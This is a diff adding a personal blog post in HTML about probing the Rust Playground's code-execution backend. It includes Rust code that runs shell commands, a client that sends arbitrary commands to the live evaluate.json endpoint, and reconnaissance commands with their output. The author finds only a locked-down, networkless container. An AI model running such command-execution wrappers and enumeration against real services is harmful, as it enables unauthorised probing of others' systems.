@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <title>Andy's Terminal - How I Thought I Hacked The Rust Book</title>
+        <meta property="og:title" content="Andy's Terminal - How I Thought I Hacked The Rust Book" />
+        <meta property="og:type" content="website" />
+        <meta property="og:url" content="https://andy.codes/content/blog/2023-04-22-how-i-thought-i-hacked-the-rust-book.html" />
+        <meta property="og:image" content="https://andy.codes/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/1.png"/>
+
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta http-equiv="Cache-control" content="no-cache, no-store, must-revalidate">
+        <meta http-equiv="Pragma" content="no-cache">
+
+        <link rel="icon" type="image/x-icon" href="/assets/img/favicon.ico" />
+        <link href="/assets/css/styles.css" rel="stylesheet">
+        <link href="/assets/css/lightbox.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
+
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
+        <script src="https://kit.fontawesome.com/506cba49ac.js" crossorigin="anonymous"></script>
+        <script src="/assets/js/lightbox-plus-jquery.min.js"></script>
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+        <script
+            async
+            src="https://www.googletagmanager.com/gtag/js?id=G-Q6PN1HTQ5K"
+        ></script>
+        <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag() {
+                dataLayer.push(arguments);
+            }
+            gtag("js", new Date());
+
+            gtag("config", "G-Q6PN1HTQ5K");
+        </script>
+    </head>
+    <body class="terminal-main">
+        <div class="container-fluid">
+        <div class="row">
+            <div class="col-sm-2 offset-sm-2 col-2">
+                <a href="https://twitter.com/0x4ndy"><i class="fa-brands fa-square-twitter"></i></a>
+                <a href="https://github.com/0x4ndy"><i class="fa-brands fa-square-github"></i></a>
+                <a href="https://infosec.exchange/@0x4ndy"><i class="fa-brands fa-mastodon"></i></a>
+            </div>
+            <div class="col-sm-2 offset-sm-4 col-8 offset-2 terminal-menu">
+                <a href="/">&#47;home</a> <a href="/content/projects">&#47;projects</a> <a href="/content/blog">&#47;blog</a> 
+            </div>
+        </div>
+            <div class="row">
+                <div class="col-sm-8 offset-sm-2 col-xs-4 offset-xs-7">
+                    <h1 class="text-center">How I Thought I Hacked The Rust Book</h1>
+                    <div class="text-center">(<a href="/content/blog">back</a>)</div>
+                    <br />
+                    <div class="section-content">
+                        I was going through the Rust Book looking for some code examples when I remembered that you can actually execute the code snippets that are listed in the book, just like the one below.
+                        <br />
+                        <a href="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/1.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/1.png"></a>
+                        <br />
+                        I don't remember what I was looking for or if I found it. The next thing I know, I'm reviewing the source of the Rust Book page trying to figure out how this functionality works. I initially thought that the code is executed as WASM somehow, but reviewing it in Burp shows that clicking the `play` button will actually make a post request to the backend.
+                        <br />
+                        <a href="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/2.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/2.png"></a>
+                        <br />
+                        It seems that whatever is in the code snippet field gets sent to `https://play.rust-lang.org/evaluate.json` using `POST` request and passing the code along in the `code` field. I'm not exactly sure to what extent the code execution is available in this functionality, but the best way to find out is to try to get the system command execution on whatever system the backend is running. Let's start with importing something that could actually give us an RCE.
+                        <br />
+                        <br />
+                        <pre>
+
+    use std::process::Command;
+                        </pre>
+                        <br />
+                        <a href="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/3.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/3.png"></a>
+                        <br />
+                        Interesting, so we can use the `Command` module from standard library? Let's try to execute some system commands... but wait, which ones? What OS is this running on? Let's check two most probable suspects: Windows and Linux.
+                        <br />
+                        <br />
+                        <pre>
+
+    use std::process::Command;
+
+    fn main() {
+        let output = if cfg!(target_os = "windows") {
+            Command::new("cmd")
+                    .args(["/C", "echo hello"])
+                    .output()
+                    .expect("failed to execute process")
+        } else {
+            Command::new("sh")
+                    .arg("-c")
+                    .arg("echo hello")
+                    .output()
+                    .expect("failed to execute process")
+        };
+    }
+                        </pre>
+                        <br />
+                        <a href="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/4.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/4.png"></a>
+                        <br />
+                        Linux it is!
+                        I guess it's time for some enumeration, but doing it from Burp is not ideal, all that copy&paste, encoding the input and decoding the output is gonna be a huge pain. What if we wrote a quick exploit to automate the process? What if we also did that in Rust? 
+                        <br />
+                        <br />
+                        So here's a short snippet:
+                        <br />
+                        <pre>
+    let code = format!(
+        "
+        use std::error::Error;
+        use std::process::Command;
+
+        fn main() -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {{
+            let output: String;
+
+            match Command::new(\"sh\").arg(\"-c\").arg(\"{}\").output() {{
+                Ok(result) =&gt; {{
+                    if result.status.success() {{
+                        output = String::from_utf8(result.stdout)?
+                    }} else {{
+                        output = String::from_utf8(result.stderr)?
+                    }}
+                }}
+                Err(e) =&gt; {{
+                    output = e.to_string();
+                }}
+
+            }}
+            println!(\"{{}}\", output);
+
+            Ok(())
+        }}
+        ",
+        cmd
+    );
+
+    let mut map = HashMap::new();
+    map.insert("version", "stable");
+    map.insert("optimize", "0");
+    map.insert("code", code.as_str());
+    map.insert("edition", "2015");
+
+    let client = reqwest::Client::new();
+    let res = client
+        .post(url)
+        .json(&map)
+        .send()
+        .await?;
+
+    let server_response = res.json::<ServerResponse>().await?;
+                        </pre>
+                        The whole code is on <a href="https://github.com/0x4ndy/playrust">my github repo</a>.
+                        <br />
+                        <br />
+                        Now I can make the requests from the command line and see all responses in my terminal.
+                        <br />
+                        <a href="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/5.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/5.png"></a>
+                        <br />
+                        <br />
+                        Ok, so let's do some enumeration now.
+                        <pre>
+
+    ./playrust https://play.rust-lang.org/evaluate.json "uname -a"
+    Linux 7e7bd9c26411 5.15.0-1031-aws #35~20.04.1-Ubuntu SMP Sat Feb 11 16:19:06 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+                        </pre>
+                        <pre>
+
+    ./playrust https://play.rust-lang.org/evaluate.json "hostname"
+    6e7e941a7a79
+                        </pre>
+                        Funny hostname, I'm defenitely in a contenair.
+                        <br />
+                        <br />
+                        <pre>
+
+    ./playrust https://play.rust-lang.org/evaluate.json "id"
+    uid=1000(playground) gid=1000(playground) groups=1000(playground)
+                        </pre>
+                        <pre>
+
+    ./playrust https://play.rust-lang.org/evaluate.json "ip a"
+    sh: 1: ip: not found
+                        </pre>
+                        <pre>
+
+    ./playrust https://play.rust-lang.org/evaluate.json "ifconfig -a"
+    sh: 1: ifconfig: not found
+                        </pre>
+                        <pre>
+
+    ./playrust https://play.rust-lang.org/evaluate.json "/sbin/ifconfig -a"
+    sh: 1: /sbin/ifconfig: not found
+                        </pre>
+                        <pre>
+
+    ./playrust https://play.rust-lang.org/evaluate.json "locate ifconfig"
+    sh: 1: locate: not found
+                        </pre>
+                        <pre>
+
+    ./playrust https://play.rust-lang.org/evaluate.json "which ifconfig"
+
+                        </pre>
+                        <pre>
+
+    ./playrust https://play.rust-lang.org/evaluate.json "ss"
+    sh: 1: ss: not found
+                        </pre>
+                        <pre>
+
+    ./playrust https://play.rust-lang.org/evaluate.json "which python"
+    /usr/bin/python
+                        </pre>
+                        <pre>
+
+    ./playrust https://play.rust-lang.org/evaluate.json "netstat -ie"
+    sh: 1: netstat: not found
+                        </pre>
+                        Really, is there no network here? How else can check if at least there are any network interfaces...
+                        <br />
+                        <br />
+                        <pre>
+            
+    ./playrust https://play.rust-lang.org/evaluate.json "(cd /proc/net/dev_snmp6/ && for device in *; do echo $device; done|sort)"
+                        </pre>
+                        <br />
+                        <a href="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/6.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/6.png"></a>
+                        <br />
+                        No network interfaces at all. Let's see the content.
+                        <br />
+                        <br />
+                        <a href="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/7.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/7.png"></a>
+                        <br />
+                        No network interfaces at all. Let's see the content.
+                        <br />
+                        <br />
+                        <a href="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/8.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/8.png"></a>
+                        <br />
+                        Ok, so we're in the docker container. In fact, we seem to be very limited, and I doubt I'll be able to do anything here in a short period of time. But still, an RCE is an RCE so, let's see if there's a way to report it (or maybe someone has done it already?).
+                        <br />
+                        <br />
+                        Reviewing the <a href="https://play.rust-lang.org/help">Rust Playground</a> help page I indeed see now that there's no network available.
+                        <br />
+                        <br />
+                        I also scanned through the Rust Playground GitHub, I've found this <a href="https://github.com/rust-lang/rust-playground/issues/626">issue</a>.
+                        <br />
+                        <br />
+                        <a href="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/9.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2023-04-22-how-i-thought-i-hacked-the-rust-book/9.png"></a>
+                        <br />
+                        <br />
+                        Dang, so it looks like people did report this to the Rust Foundation, but because the contanair is very secured, this RCE doesn't pose a risk.
+                        <br />
+                        <br />
+                        It looks like this issue has been open since 2020 and no one has resolve it. I thought I could be a good open-source citizen and resolved it myself <a href="https://github.com/rust-lang/rust-playground/commit/7824753c7ede8c752042257e1e0878b48a5a924d">here</a>. 
+                        <br />
+                        <br />
+                        Although the results are a little bit disappointing, it was still an interesting excercise. For a moment I even got a little excited, when I started enumerating the system, but the moment I realised that there are no network interfaces at all, it was obvious that it's a deadend - at least for me and at least for now.
+                        <br />
+                        <br />
+                        If you plan to play with Rust Playground, I suggest you set up a <a href="https://github.com/rust-lang/rust-playground">local instance</a> - that's also what I did eventually.
+                    </div>
+                    <br />
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-sm-8 offset-sm-2 col-xs-4 offset-xs-7">
+                    <span class="color-green">0x4ndy:<span class="color-blue">~</span></span><span class="fa-solid fa-terminal color-blue"></span>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
